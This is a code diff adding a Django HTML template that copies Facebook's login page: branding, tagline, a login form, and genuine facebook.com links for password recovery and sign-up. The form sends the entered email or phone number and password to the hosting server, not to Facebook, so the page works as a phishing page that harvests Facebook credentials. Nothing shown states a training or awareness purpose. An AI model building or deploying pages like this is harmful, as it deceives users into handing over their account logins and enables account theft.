@@ -1,0 +1,59 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook — log in or sign up</title>
+
+    <link rel="stylesheet" href="{% static 'index.css' %}">
+</head>
+
+<body>
+    <div class="container">
+        <section class="intro-section">
+            <h1>facebook</h1>
+
+            <p>Facebook helps you connect and share with the people in your life.</p>
+        </section>
+
+        <section class="signin-section">
+            <div>
+                <form method='post'>
+                    {% csrf_token %}
+                    <div>
+                        <input type="text" name="login" placeholder="Email address or phone number">
+                    </div>
+
+                    <div>
+                        <input type="text" name="password" placeholder="Password">
+                    </div>
+
+                    <div>
+                        <button type="submit">Log in</button>
+                    </div>
+
+                    <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten password?</a>
+
+                    <hr />
+
+                    <div class="create-btn">
+                        <a href="https://www.facebook.com/campaign/landing.php?campaign_id=1635645080&extra_1=s%7Cc%7C313664978333%7Ce%7Cfacebook%20register%7C&placement=&creative=313664978333&keyword=facebook%20register&partner_id=googlesem&extra_2=campaignid%3D1635645080%26adgroupid%3D61402567094%26matchtype%3De%26network%3Dg%26source%3Dnotmobile%26search_or_content%3Ds%26device%3Dc%26devicemodel%3D%26adposition%3D%26target%3D%26targetid%3Dkwd-299018535828%26loc_physical_ms%3D1028523%26loc_interest_ms%3D%26feeditemid%3D%26param1%3D%26param2%3D&gad_source=1&gclid=EAIaIQobChMIqePzk5ikhwMVdxaiAx2c3gOAEAAYASAAEgJeBfD_BwE">Create new account</a>
+                    </div>
+                </form>
+
+
+            </div>
+
+
+            <p>
+                <a href="#"><strong>
+                        Create a Page
+                    </strong></a> for a celebrity, brand or business.
+            </p>
+        </section>
+    </div>
+</body>
+
+</html>
